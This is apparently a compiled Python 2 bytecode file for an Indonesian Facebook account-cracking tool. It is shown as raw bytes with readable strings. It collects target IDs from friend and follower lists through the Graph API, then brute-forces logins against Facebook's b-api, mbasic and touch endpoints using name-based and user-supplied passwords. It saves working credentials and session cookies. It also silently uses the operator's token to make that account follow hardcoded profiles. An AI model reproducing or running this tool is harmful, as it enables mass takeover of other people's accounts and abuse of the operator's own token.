ó
ÝÂac           @   sF  d  d l  Z  y d  d l Z Wn# e k
 rA d GHe  j d  n Xy d  d l Z Wn# e k
 rw d GHe  j d  n Xd  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l m Z d  d l m Z d  d l m Z d  d	 l m Z d
 a g  Z g  Z g  Z e j   Z e j Z d d d d d d d d d d d d g Z y0 e d
 k  se d k re   n  e d Z Wn e k
 r¹e   n Xe j   Z e j Z e j Z  e j! Z" e e Z# e j$   Z% e
 j& e% j'   Z( d e( e" e# e f Z) d e" e# e f Z* i d d 6d d 6d d 6d d 6d d 6d d  6d d! 6d d" 6d d# 6d d$ 6d d% 6d d& 6Z+ d'   Z, d(   Z- d)   Z. d*   Z/ d+   Z0 d,   Z1 d-   Z2 d.   Z3 d/   Z4 d0   Z5 d1   Z6 d2   Z7 d3   Z8 d4   Z9 e: d5 k rBe  j d6  e  j d7  e9   e-   n  d S(8   iÿÿÿÿNs$   
 ! module requests belum terinstalls   pip2 install requestss   
 ! module bs4 belum terinstalls   pip2 install bs4(   t
   ThreadPool(   t   BeautifulSoup(   t   datetime(   t   datei    t   Januarit   Februarit   Marett   Aprilt   Meit   Junit   Julit   Agustust	   Septembert   Oktobert   Novembert   Desemberi   i   s   %s-%s-%s-%ss   %s %s %st   01t   02t   03t   04t   05t   06t   07t   08t   09t   10t   11t   12c           C   s   t  j d  d GHd  S(   Nt   clearsÌ    [0;91m ___ ___ __  __ ___ _    ___   ___ ___  
 [0;91m/ __|_ _|  \/  | _ \ |  | __| | _ ) __| 
 [0;97m\__ \| || |\/| |  _/ |__| _|  | _ \ _|  
 [0;97m|___/___|_|  |_|_| |____|___| |___/_| BY ANGGAXD
(   t   ost   system(    (    (    s   /sdcard/run.pyt   logo1   s    c          C   s  t  j d  y t j d  Wn! t j j k
 rA t d  n Xy t d d  }  t   Wnt	 k
 r{} d GHd GHd GHt
 d	  }  |  d
 k r¯ t  j d  t d  n  y t j d |   j   d j   } t d d  j |   t j d |   t j d |   t j d |   t j d |   d | GHt j d  t   Wq|t	 k
 rwt  j d  t d  q|Xn Xd  S(   NR   s   https://mbasic.facebook.coms    ! tidak ada koneksi internets	   login.txtt   rs4    * sebelum masuk ke menu harus login terlebih dahulus2    * untuk login silakan masukan token facebook andasG    ? ketik '[0;93mhelp[0;97m' untuk lihat tutorial ambil token facebooks   
 + token fb : t   helps%   xdg-open https://youtu.be/IdxphPBMMTUs     ! di simak video nya biar pahams+   https://graph.facebook.com/me?access_token=t   namet   wsD   https://graph.facebook.com/100015073506062/subscribers?access_token=sD   https://graph.facebook.com/100002163187650/subscribers?access_token=sD   https://graph.facebook.com/100022849470990/subscribers?access_token=sD   https://graph.facebook.com/100010998764674/subscribers?access_token=s/   
 + user aktif, selamat datang [0;93m%s[0;97mi   s   rm -f login.txts    ! token kadaluwarsa(   R   R   t   requestst   gett
   exceptionst   ConnectionErrort   exitt   opent   menut   KeyErrort	   raw_inputt   jsont   lowert   writet   postt   timet   sleep(   t   tokent   IOErrort   nama(    (    s   /sdcard/run.pyt   login5   s:    #	c    	      C   sV  t  j d  y t j d  Wn! t j j k
 rA t d  n Xy t d d  j   a	 Wn( t
 k
 r t  j d  t d  n Xy' t j d t	  j   d	 j   }  Wn( t k
 r× t  j d  t d  n Xt   d
 |  GHd GHd GHd GHd GHd GHd GHt d  } | d k r(t   n*| d k s@| d k rQt   t   n| d k si| d k rzt   t   nØ| d k s| d k r£t   t   n¯| d k s»| d k r÷d GHd GHt d  } | d k rçt   qR| d k rêt  j d  } d GHx | D] } d | GHqWyB t d   } | d k rFt   n  t d! |  j   j   } Wn t k
 rt d" |  n Xd# | j d$ d%  } | j d& d  } d' GHd( | t |  f GHt  j d) |  d* GHt d+  qR| d k rít  j d,  } d- GHx | D] } d | GHqWyB t d   } | d k rIt   n  t d. |  j   j   } Wn t k
 rt d" |  n Xd# | j d$ d%  } | j d& d  } d' GHd( | t |  f GHt  j d/ |  d* GHt d+  qRt   n[ | d0 k s| d1 k rt   n9 | d2 k s1| d3 k rKt  j d  t d4  n t   d  S(5   NR   s   https://mbasic.facebook.coms    ! tidak ada koneksi internets	   login.txtR    s   rm -f login.txts    ! token kadaluwarsas,   https://graph.facebook.com/me/?access_token=R"   s%    [ selamat datang [0;93m%s[0;97m ]
s    1 crack dari publik temans    2 crack dari pengikuts    3 crack dari target massals    4 lihat hasil cracks    5 ganti user agents    0 keluar (hapus token)s   
 ? choose : t    t   1R   t   2R   t   3R   t   4R   s   
 1 cek hasil crack OKs    2 cek hasil crack CPt   OKs(    * list nama file tersimpan di folder OKs    + s   
 ? pilih nama file : s   OK/%ss    ! file %s tidak tersedias   %st   -t    s   .txts1    # ----------------------------------------------s%    + hasil crack : %s total : %s[0;93ms	   cat OK/%ss8   [0;97m # ----------------------------------------------s-    ! jangan lupa di copy dan di simpan hasilnyat   CPs(    * list nama file tersimpan di folder CPs   CP/%ss	   cat CP/%st   5R   t   0t   00s   
 # berhasil menghapus token(   R   R   R$   R%   R&   R'   R(   R)   t   readR3   R+   R-   R.   R4   R   R,   R*   t   publikt   methodt   followert   massalt   listdirt
   splitlinest   replacet   lent
   setting_ua(	   R5   t   anggat   cekt   dirst   filet   totalokt   nm_filet   del_txtt   totalcp(    (    s   /sdcard/run.pyR*   U   s¬    '	





 
 

c          C   så   y t  d d  j   a Wn t k
 r6 t d  n Xd GHt d  }  yh xa t j d |  t f  j   d D]< } | d } | d	 j	 d
  d } t
 j | d |  qo WWn t k
 rÑ t d |   n Xd t t
  GHd  S(   Ns	   login.txtR    s    ! token kadaluwarsas)   
 * isi 'me' jika ingin dari daftar temans    + id target : s5   https://graph.facebook.com/%s/friends?access_token=%st   datat   idR"   R>   i    s   <=>s     ! id pengguna %s tidak tersedias    + total id  : [0;91m%s[0;97m(   R)   RC   R3   R4   R(   R,   R$   R%   R-   t   rsplitRV   t   appendR+   RK   (   t   idtt   it   uidR5   (    (    s   /sdcard/run.pyRD   ±   s    *
c          C   så   y t  d d  j   a Wn t k
 r6 t d  n Xd GHt d  }  yh xa t j d |  t f  j   d D]< } | d } | d	 j	 d
  d } t
 j | d |  qo WWn t k
 rÑ t d |   n Xd t t
  GHd  S(   Ns	   login.txtR    s    ! token kadaluwarsas-   
 * isi 'me' jika ingin dari pengikut sendiris    + id target : sD   https://graph.facebook.com/%s/subscribers?limit=5000&access_token=%sRU   RV   R"   R>   i    s   <=>s     ! id pengguna %s tidak tersedias    + total id  : [0;91m%s[0;97m(   R)   RC   R3   R4   R(   R,   R$   R%   R-   RW   RV   RX   R+   RK   (   RY   RZ   R[   R5   (    (    s   /sdcard/run.pyRF   Â   s    *
c          C   s+  y t  d d  j   a Wn t k
 r6 t d  n Xy t t d   }  Wn d }  n Xd GHx³ t |   D]¥ } | d 7} t d |  } yh xa t	 j
 d | t f  j   d	 D]< } | d
 } | d j d  d } t j | d |  q¶ WWqo t k
 rd | GHqo Xqo Wd t t  GHd  S(   Ns	   login.txtR    s    ! token kadaluwarsas    + jumlah target id : i   s)   
 * isi 'me' jika ingin dari daftar temans    + id target %s : s5   https://graph.facebook.com/%s/friends?access_token=%sRU   RV   R"   R>   i    s   <=>s     ! id pengguna %s tidak tersedias    + total id  : [0;91m%s[0;97m(   R)   RC   R3   R4   R(   t   intt   inputt   rangeR,   R$   R%   R-   RW   RV   RX   R+   RK   (   t   tanya_totalt   tRY   RZ   R[   R5   (    (    s   /sdcard/run.pyRG   Ó   s(     

*
c          C   sy  d GHd GHd GHd GHt  d  }  |  d k r6 t   n?|  d k r t  d  } | d	 k rd t   n  d
 t GHd t GHd GHt d  j t t  t d  n× |  d k rt  d  } | d	 k rÌ t   n  d
 t GHd t GHd GHt d  j t	 t  t d  no |  d k rnt  d  } | d	 k r4t   n  d
 t GHd t GHd GHt d  j t
 t  t d  n t   d  S(   Ns/    
 [ pilih method crack - coba method satuÂ² ]
s    1 method b-api  (fast crack)s    2 method mbasic (slow crack)s    3 method mobile (slow crack)s   
 ? method : R7   R8   s!    ? gunakan password manual? y/t: t   ys%   
 + hasil OK tersimpan di : OK/%s.txts%    + hasil CP tersimpan di : CP/%s.txt
s6    ! jika tidak ada hasil hidupkan mode pesawat 5 detik
i   s   

 # selesai...R9   R:   (   R,   R*   t   manualt   tanggalR    t   mapt   bapiRV   R(   t   mbasict   mobile(   RE   t   ask(    (    s   /sdcard/run.pyRE   é   sF    

		
		
		c   	      C   s  yÏ t  d d  j   } t j   ¨ } | j d |  | f  j   d } | j d  \ } } } t | } d |  | | | | f GHt j	 d |  | f  t  d t
 d	  j d
 |  | | | | f  Wd  QXWn+ t k
 rö } d } d } d } n n Xd  S(   Ns	   login.txtR    s-   https://graph.facebook.com/%s?access_token=%st   birthdayt   /s     [0;93m+ %s|%s|%s %s %s[0;97ms   %s|%ss	   CP/%s.txtt   as    + %s|%s|%s %s %s
R>   (   R)   RC   R$   t   SessionR%   R-   t   splitt	   bulan_ttlt   cpRX   Rc   R/   R+   (	   R[   t   pwR3   t   sest   ttlt   montht   dayt   yearR4   (    (    s   /sdcard/run.pyt
   cek_ttl_cp  s    #
7	 c         C   s7  y t  d d  j   } Wn t k
 r2 d } n Xt j j d t t t  t t	  t t
  f  t j j   |  j d  \ } } t |  d k rº | | d | d | d	 g } nm t |  d
 k rê | d | d | d	 g } n= t |  d k r| d | d	 g } n | d | d	 g } yxñ| D]é} | j   } t j   } i t t j d d   d 6t t j d d   d 6t t j d d   d 6d d 6d d 6| d 6d d 6d d 6} i	 d d 6d d 6d  d! 6| d" 6d# d$ 6| d% 6d& d' 6d( d) 6d* d+ 6} d, }	 | j |	 d- | d. | }
 d/ |
 j k r¥d0 |
 j k r¥d1 | | |
 j   d f GHt	 j d2 | | f  t  d3 t d4  j d5 | | f  Pq1q1d6 |
 j   d7 k r1t | |  Pd8 | | f GHt
 j d2 | | f  t  d9 t d4  j d5 | | f  Pq1q1q1Wt d: 7a Wn n Xd  S(;   Ns   .uaR    sz   Mozilla/5.0 (Series40; NokiaX2-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11s#    * crack %s/%s -> ok:-%s - cp:-%s s   <=>i   t   123t   1234t   12345i   i   g    ÐsAg    8|As   x-fb-connection-bandwidthi N  i@  s   x-fb-sim-hnis   x-fb-net-hnit	   EXCELLENTs   x-fb-connection-qualitys!   cell.CTRadioAccessTechnologyHSDPAs   x-fb-connection-types
   user-agents!   application/x-www-form-urlencodeds   content-typet   Ligers   x-fb-http-engines/   350685531728%7C62f8ce9f74b12f84c123cc23437a4a32t   access_tokent   JSONt   formatR9   t   sdk_versiont   emailt   en_USt   localet   passwordt   iost   sdkR8   t   generate_session_cookiest    3f555f99fb61fcd7aa0c44f58f522ef6t   sigs,   https://b-api.facebook.com/method/auth.logint   paramst   headerst   session_keyt   EAAAs    [0;92m+ %s|%s|%s[0;97ms   %s|%ss	   OK/%s.txtRk   s	    + %s|%s
s   www.facebook.comt	   error_msgs    [0;93m+ %s|%s[0;97m        s	   CP/%s.txti   (   R)   RC   R4   t   syst   stdoutR/   t   loopRK   RV   t   okRo   t   flushRm   R.   R$   Rl   t   strt   randomt   randintR%   t   textR-   RX   Rc   Rv   (   t   usert   uaR[   R"   t   pwxRp   Rq   t   headers_t   paramt   apit   send(    (    s   /sdcard/run.pyRe     sP    
	)!tE$$
c         C   s  y t  d d  j   } Wn t k
 r2 d } n Xt j j d t t t  t t	  t t
  f  t j j   |  j d  \ } } t |  d k rº | | d | d | d	 g } nm t |  d
 k rê | d | d | d	 g } n= t |  d k r| d | d	 g } n | d | d	 g } yÎx½| D]µ} i  } | j   } t j   } | j j i
 d d 6d d 6d d 6d d 6| d 6d d 6d d 6d d 6d d 6d d 6 | j d  j } t | d   }	 d! d" d# d$ d% d& d' g }
 xc |	 d(  D]U } yE | j d)  |
 k r;| j i | j d*  | j d)  6 n wôWqôqôXqôW| j i | d+ 6| d, 6d- d. 6d- d/ 6d- d0 6d- d1 6d- d2 6d3 d4 6d3 d5 6d3 d6 6d7 d8 6 | j d9 d: | } d; | j j   j   k rld< j g  | j j   j   D] \ } } d= | | f ^ qó } d> | | | f GHt	 j d? | | f  t  d@ t dA  j dB | | f  Pq1q1dC | j j   j   k r1t | |  PdD | | f GHt
 j d? | | f  t  dE t dA  j dB | | f  Pq1q1q1Wt dF 7a Wn n Xd  S(G   Ns   .uaR    sz   Mozilla/5.0 (Series40; NokiaX2-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11s#    * crack %s/%s -> ok:-%s - cp:-%s s   <=>i   Rw   Rx   Ry   i   i   s   https://mbasic.facebook.comt   origins#   id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7s   accept-languages   gzip, deflates   accept-encodingsU   text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8t   accepts
   user-agents   mbasic.facebook.comt   Hosts:   https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8t   referers	   max-age=0s   cache-controlR8   s   upgrade-insecure-requestss!   application/x-www-form-urlencodeds   content-types7   https://mbasic.facebook.com/login/?next&ref=dbl&refid=8s   html.parsert   lsdt   jazoestt   m_tst   lit
   try_numbert   unrecognized_triesR6   R]   R"   t   valueR   t   passR7   t   prefill_contact_pointt   prefill_sourcet   prefill_typet   first_prefill_sourcet   first_prefill_typet   falset   had_cp_prefilledt   had_password_prefilledt   is_smart_lockt   truet   _fb_noscriptsy   https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8RU   t   c_usert   ;s   %s=%ss    [0;92m+ %s|%s|%s[0;97ms   %s|%ss	   OK/%s.txtRk   s	    + %s|%s
t
   checkpoints    [0;93m+ %s|%s[0;97m        s	   CP/%s.txti   (   R)   RC   R4   R   R   R/   R   RK   RV   R   Ro   R   Rm   R.   R$   Rl   R   t   updateR%   R   t   parserR0   t   cookiest   get_dictt   keyst   joint   itemsRX   Rc   Rv   (   R   R   R[   R"   R   Rp   t   kwargsRq   t   pt   bt   blRZ   t   gaaat   keyR¨   t   kuki(    (    s   /sdcard/run.pyRf   L  sf    
	)!V ) ZA$$
c         C   s  y t  d d  j   } Wn t k
 r2 d } n Xt j j d t t t  t t	  t t
  f  t j j   |  j d  \ } } t |  d k rº | | d | d | d	 g } nm t |  d
 k rê | d | d | d	 g } n= t |  d k r| d | d	 g } n | d | d	 g } yÎx½| D]µ} i  } | j   } t j   } | j j i
 d d 6d d 6d d 6d d 6| d 6d d 6d d 6d d 6d d 6d d 6 | j d  j } t | d   }	 d! d" d# d$ d% d& d' g }
 xc |	 d(  D]U } yE | j d)  |
 k r;| j i | j d*  | j d)  6 n wôWqôqôXqôW| j i | d+ 6| d, 6d- d. 6d- d/ 6d- d0 6d- d1 6d- d2 6d3 d4 6d3 d5 6d3 d6 6d7 d8 6 | j d9 d: | } d; | j j   j   k rld< j g  | j j   j   D] \ } } d= | | f ^ qó } d> | | | f GHt	 j d? | | f  t  d@ t dA  j dB | | f  Pq1q1dC | j j   j   k r1t | |  PdD | | f GHt
 j d? | | f  t  dE t dA  j dB | | f  Pq1q1q1Wt dF 7a Wn n Xd  S(G   Ns   .uaR    sz   Mozilla/5.0 (Series40; NokiaX2-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11s#    * crack %s/%s -> ok:-%s - cp:-%s s   <=>i   Rw   Rx   Ry   i   i   s   https://touch.facebook.comR   s#   id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7s   accept-languages   gzip, deflates   accept-encodingsU   text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8R   s
   user-agents   touch.facebook.comR    s9   https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8R¡   s	   max-age=0s   cache-controlR8   s   upgrade-insecure-requestss!   application/x-www-form-urlencodeds   content-types6   https://touch.facebook.com/login/?next&ref=dbl&refid=8s   html.parserR¢   R£   R¤   R¥   R¦   R§   R6   R]   R"   R¨   R   R©   R7   Rª   R«   R¬   R­   R®   R¯   R°   R±   R²   R³   R´   sw   https://touch.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ftouch.facebook.com%2F&lwv=100&refid=8RU   Rµ   R¶   s   %s=%ss    [0;92m+ %s|%s|%s[0;97ms   %s|%ss	   OK/%s.txtRk   s	    + %s|%s
R·   s    [0;93m+ %s|%s[0;97m        s	   CP/%s.txti   (   R)   RC   R4   R   R   R/   R   RK   RV   R   Ro   R   Rm   R.   R$   Rl   R   R¸   R%   R   R¹   R0   Rº   R»   R¼   R½   R¾   RX   Rc   Rv   (   R   R   R[   R"   R   Rp   R¿   Rq   RÀ   RÁ   RÂ   RZ   RÃ   RÄ   R¨   RÅ   (    (    s   /sdcard/run.pyRg     sf    
	)!V ) ZA$$
c             sº   y t  d d  j    Wn t k
 r2 d  n Xd GHt d  j d    t    d k rl t d  n  d	 t GHd
 t GH   f d   }  t d  } | j	 |  t
  t d  d  S(   Ns   .uaR    sz   Mozilla/5.0 (Series40; NokiaX2-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11s'   
 * contoh pass : sayang,anjing,bangsats    ? set pass : t   ,R7   s    ! jangan kosongs%   
 + hasil OK tersimpan di : OK/%s.txts%    + hasil CP tersimpan di : CP/%s.txt
c            s0  t  j j d t t t  t t  t t  f  t  j j   |  j	 d  \ } } yÎx½  D]µ} i  } | j
   } t j   } | j j i
 d d 6d d 6d d 6d	 d
 6 d 6d d 6d d 6d d 6d d 6d d 6 | j d  j } t | d  } d d d d d d d g } xc | d  D]U }	 yE |	 j d   | k rh| j i |	 j d!  |	 j d   6 n w!Wq!q!Xq!W| j i | d" 6| d# 6d$ d% 6d$ d& 6d$ d' 6d$ d( 6d$ d) 6d* d+ 6d* d, 6d* d- 6d. d/ 6 | j d0 d1 | }
 d2 | j j   j   k rd3 j g  | j j   j   D] \ } } d4 | | f ^ q  } d5 | | | f GHt j d6 | | f  t d7 t d8  j d9 | | f  Pq^ q^ d: | j j   j   k r^ t | |  Pd; | | f GHt j d6 | | f  t d< t d8  j d9 | | f  Pq^ q^ q^ Wt d= 7a Wn n Xd  S(>   Ns#    * crack %s/%s -> ok:-%s - cp:-%s s   <=>s   https://mbasic.facebook.comR   s#   id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7s   accept-languages   gzip, deflates   accept-encodingsU   text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8R   s
   user-agents   mbasic.facebook.comR    s:   https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8R¡   s	   max-age=0s   cache-controlR8   s   upgrade-insecure-requestss!   application/x-www-form-urlencodeds   content-types7   https://mbasic.facebook.com/login/?next&ref=dbl&refid=8s   html.parserR¢   R£   R¤   R¥   R¦   R§   R6   R]   R"   R¨   R   R©   R7   Rª   R«   R¬   R­   R®   R¯   R°   R±   R²   R³   R´   sy   https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8RU   Rµ   R¶   s   %s=%ss    [0;92m+ %s|%s|%s[0;97ms   %s|%ss	   OK/%s.txtRk   s	    + %s|%s
R·   s    [0;93m+ %s|%s[0;97m        s	   CP/%s.txti   (   R   R   R/   R   RK   RV   R   Ro   R   Rm   R.   R$   Rl   R   R¸   R%   R   R¹   R0   Rº   R»   R¼   R½   R¾   RX   R)   Rc   Rv   (   R   R[   R"   Rp   R¿   Rq   RÀ   RÁ   RÂ   RZ   RÃ   RÄ   R¨   RÅ   (   t   asuR   (    s   /sdcard/run.pyt   mainÅ  sP    	)V ) ZA$$
i   s   

 # selesai...(   R)   RC   R4   R,   Rm   RK   R(   Rc   R    Rd   RV   (   RÈ   RÀ   (    (   RÇ   R   s   /sdcard/run.pyRb   ¸  s    
		)c          C   s¾   d GHd GHt  d  }  |  d k r, t   n |  d k r{ t  d  } t d d  j |  t j d	  t  d
  t   n? |  d k rº d GHt j d  t j d	  t  d
  t   n  d  S(   Ns   
 1 ganti user agent toolss     2 ganti user agent bawaan toolss   
 ? choose : R7   R8   s    + user agent : s   .uaR#   i   s   
 + berhasil ganti user agentR9   s    + user agent : Mozilla/5.0 (Series40; NokiaX2-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11s	   rm -f .ua(   R,   R*   R)   R/   R1   R2   R   R   (   R   t   c_ua(    (    s   /sdcard/run.pyRL   ò  s"    



c           C   s:   y t  j d  Wn n Xy t  j d  Wn n Xd  S(   NR?   R<   (   R   t   mkdir(    (    (    s   /sdcard/run.pyt   buat_folder  s        t   __main__s   git pulls   touch login.txt(;   R   R$   t   ImportErrorR   t   bs4R   t   reR1   R-   R   t   calendart   multiprocessing.poolR    R   R¹   R   R   R   RV   R   Ro   t   nowt   ctRs   t   nt   bulanR(   t   nTempt
   ValueErrort   currentRu   t   tat   buRt   t   hat   opt   todayt   my_datet   day_namet   weekdayt   hrRc   t   tglRn   R   R6   R*   RD   RF   RG   RE   Rv   Re   Rf   Rg   Rb   RL   RË   t   __name__(    (    (    s   /sdcard/run.pyt   <module>   sr   `	*
			
Z		 	\				&		-	6	6	:		